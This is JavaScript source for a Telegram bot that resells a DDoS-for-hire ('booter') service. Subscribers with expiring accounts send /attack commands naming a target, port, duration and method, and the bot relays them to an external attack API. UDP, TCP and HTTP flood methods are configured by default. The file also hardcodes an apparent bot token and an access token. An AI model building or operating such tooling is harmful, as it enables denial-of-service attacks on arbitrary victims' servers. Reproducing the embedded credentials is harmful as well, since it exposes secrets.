const { Telegraf } = require('telegraf');
const fs = require('fs');
const axios = require('axios');

// Load configuration
const loadConfig = () => {
  return JSON.parse(fs.readFileSync('./config.json', 'utf8'));
};

// Load methods
const loadMethods = () => {
  return JSON.parse(fs.readFileSync('./methods.json', 'utf8'));
};

// Save configuration
const saveConfig = (config) => {
  fs.writeFileSync('./config.json', JSON.stringify(config, null, 2));
};

// User management functions
const isAuthorized = (userId, config) => {
  return config.users.hasOwnProperty(userId);
};

const isExpired = (userId, config) => {
  const user = config.users[userId];
  if (!user) return true;
  
  const expiryDate = new Date(user.expired);
  return new Date() > expiryDate;
};

const isOnCooldown = (userId, config) => {
  const user = config.users[userId];
  if (!user) return false;
  
  if (!user.lastRequest) return false;
  
  const cooldownTime = user.cooldown || config.defaultCooldown;
  const timeSinceLastRequest = (Date.now() - user.lastRequest) / 1000;
  return timeSinceLastRequest < cooldownTime;
};

const getCooldownRemaining = (userId, config) => {
  const user = config.users[userId];
  if (!user || !user.lastRequest) return 0;
  
  const cooldownTime = user.cooldown || config.defaultCooldown;
  const timeSinceLastRequest = (Date.now() - user.lastRequest) / 1000;
  return Math.max(0, cooldownTime - timeSinceLastRequest);
};

const hasReachedConcurrentLimit = (userId, config) => {
  const user = config.users[userId];
  if (!user) return true;
  
  return (user.activeRequests || 0) >= user.concurrent;
};

// Initialize the bot
const initBot = () => {
  const config = loadConfig();
  const bot = new Telegraf(config.botToken);
  
  // Setup middleware for user authorization
  bot.use(async (ctx, next) => {
    const userId = ctx.from.id.toString();
    
    // Check if user is authorized
    if (!isAuthorized(userId, config)) {
      return ctx.reply('❌ You are not authorized to use this bot. Please contact the administrator.');
    }
    
    // Check if user account is expired
    if (isExpired(userId, config)) {
      return ctx.reply('❌ Your account has expired. Please contact the administrator to renew your subscription.');
    }
    
    await next();
  });
  
  // Start command
  bot.start((ctx) => {
    const userId = ctx.from.id.toString();
    const username = ctx.from.username || ctx.from.first_name;
    const user = config.users[userId];
    
    let message = `Welcome, ${username}! 👋\n\n`;
    message += `Your account expires on: ${user.expired}\n`;
    message += `Concurrent requests: ${user.concurrent}\n`;
    message += `Max request time: ${user.maxtime} seconds\n`;
    message += `Cooldown: ${user.cooldown} seconds\n\n`;
    message += `Available commands:\n`;
    message += `/start - Show this message\n`;
    message += `/methods - Show available API methods\n`;
    message += `/attack <target> <port> <time> <method> - Send API request\n`;
    message += `/status - Check your account status`;
    
    ctx.reply(message);
  });
  
  // Methods command
  bot.command('methods', async (ctx) => {
    try {
      const methods = loadMethods();
      let message = '📋 Available Methods:\n\n';
      
      for (const method of methods) {
        message += `• ${method.name} - ${method.description}\n`;
      }
      
      ctx.reply(message);
    } catch (error) {
      console.error('Error displaying methods:', error);
      ctx.reply('❌ Error loading methods. Please try again later.');
    }
  });
  
  // Status command
  bot.command('status', (ctx) => {
    const userId = ctx.from.id.toString();
    const user = config.users[userId];
    
    let message = `📊 Account Status:\n\n`;
    message += `Expiration: ${user.expired}\n`;
    message += `Concurrent limit: ${user.concurrent}\n`;
    message += `Active requests: ${user.activeRequests || 0}\n`;
    message += `Cooldown: ${user.cooldown} seconds\n`;
    
    if (isOnCooldown(userId, config)) {
      message += `⏱️ Cooldown remaining: ${getCooldownRemaining(userId, config).toFixed(1)} seconds\n`;
    } else {
      message += `✅ Ready to use\n`;
    }
    
    ctx.reply(message);
  });
  
  // Attack command
  bot.command('attack', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = config.users[userId];
    const config = loadConfig(); // Reload config
    
    // Parse command arguments
    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 4) {
      return ctx.reply('❌ Usage: /attack <target> <port> <time> <method>');
    }
    
    const [target, port, time, method] = args;
    
    // Validate time
    const requestedTime = parseInt(time);
    if (isNaN(requestedTime) || requestedTime <= 0) {
      return ctx.reply('❌ Invalid time parameter. Please use a positive number.');
    }
    
    // Check if time exceeds user's max time
    if (requestedTime > user.maxtime) {
      return ctx.reply(`❌ Time exceeds your maximum allowed time (${user.maxtime} seconds).`);
    }
    
    // Check cooldown
    if (isOnCooldown(userId, config)) {
      const cooldownRemaining = getCooldownRemaining(userId, config);
      return ctx.reply(`❌ You are on cooldown. Please wait ${cooldownRemaining.toFixed(1)} seconds.`);
    }
    
    // Check concurrent limit
    if (hasReachedConcurrentLimit(userId, config)) {
      return ctx.reply('❌ You have reached your concurrent requests limit.');
    }
    
    // Check if method exists
    const methods = loadMethods();
    const methodExists = methods.some(m => m.name.toLowerCase() === method.toLowerCase());
    if (!methodExists) {
      return ctx.reply('❌ Invalid method. Use /methods to see available methods.');
    }
    
    try {
      // Update user stats
      config.users[userId].lastRequest = Date.now();
      config.users[userId].activeRequests = (config.users[userId].activeRequests || 0) + 1;
      saveConfig(config);
      
      // Send waiting message
      ctx.reply(`🔄 Processing request...`);
      
      // Make API request
      const response = await axios.get(`${config.apiUrl}`, {
        params: {
          token: user.token,
          target: target,
          port: port,
          time: time,
          method: method
        }
      });
      
      // Create message with request details
      let message = `✅ Request sent successfully!\n\n`;
      message += `📌 Target: ${target}\n`;
      message += `🔌 Port: ${port}\n`;
      message += `⏱️ Time: ${time} seconds\n`;
      message += `📋 Method: ${method}\n`;
      
      if (response.data) {
        message += `\n🔄 API Response: ${JSON.stringify(response.data)}`;
      }
      
      ctx.reply(message);
      
      // Set a timeout to reduce active requests when done
      setTimeout(() => {
        const updatedConfig = loadConfig();
        if (updatedConfig.users[userId].activeRequests > 0) {
          updatedConfig.users[userId].activeRequests--;
          saveConfig(updatedConfig);
        }
      }, requestedTime * 1000);
      
    } catch (error) {
      console.error('API request error:', error);
      ctx.reply(`❌ Error sending request: ${error.message}`);
      
      // Reset active requests on error
      const updatedConfig = loadConfig();
      if (updatedConfig.users[userId].activeRequests > 0) {
        updatedConfig.users[userId].activeRequests--;
        saveConfig(updatedConfig);
      }
    }
  });
  
  // Admin commands (only for the admin user)
  bot.command('adduser', (ctx) => {
    const userId = ctx.from.id.toString();
    if (userId !== config.adminId) {
      return ctx.reply('❌ You are not authorized to use admin commands.');
    }
    
    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 5) {
      return ctx.reply('❌ Usage: /adduser <userId> <expiry_date> <maxtime> <concurrent> <cooldown>');
    }
    
    const [newUserId, expiry, maxtime, concurrent, cooldown] = args;
    
    const updatedConfig = loadConfig();
    updatedConfig.users[newUserId] = {
      expired: expiry, // Format: YYYY-MM-DD
      maxtime: parseInt(maxtime),
      concurrent: parseInt(concurrent),
      cooldown: parseInt(cooldown),
      token: `user_${newUserId}_${Date.now()}`
    };
    
    saveConfig(updatedConfig);
    ctx.reply(`✅ User ${newUserId} added successfully.`);
  });
  
  return bot;
};

// Create config.json if it doesn't exist
const createConfigIfNotExists = () => {
  if (!fs.existsSync('./config.json')) {
    const defaultConfig = {
      botToken: "7177796181:AAG6SwfRa7ajhCsIPITPbmYHydU3VuqHkbg",
      apiUrl: "https://apikey-production.up.railway.app/api/attack",
      defaultCooldown: 60,
      adminId: "ADMIN_TELEGRAM_ID", // Replace with your Telegram ID
      users: {
        "ADMIN_TELEGRAM_ID": { // Replace with your Telegram ID
          expired: "2025-12-31",
          maxtime: 300,
          concurrent: 5,
          cooldown: 30,
          token: "isalmods"
        }
      }
    };
    
    fs.writeFileSync('./config.json', JSON.stringify(defaultConfig, null, 2));
    console.log('Created default config.json');
  }
};

// Create methods.json if it doesn't exist
const createMethodsIfNotExists = () => {
  if (!fs.existsSync('./methods.json')) {
    const defaultMethods = [
      {
        "name": "UDP",
        "description": "UDP flood method"
      },
      {
        "name": "TCP",
        "description": "TCP flood method"
      },
      {
        "name": "HTTP",
        "description": "HTTP flood method"
      }
    ];
    
    fs.writeFileSync('./methods.json', JSON.stringify(defaultMethods, null, 2));
    console.log('Created default methods.json');
  }
};

// Main function
const main = async () => {
  createConfigIfNotExists();
  createMethodsIfNotExists();
  
  const bot = initBot();
  
  bot.launch();
  console.log('Bot started successfully!');
  
  // Enable graceful stop
  process.once('SIGINT', () => bot.stop('SIGINT'));
  process.once('SIGTERM', () => bot.stop('SIGTERM'));
};

main().catch(error => {
  console.error('Bot error:', error);
});
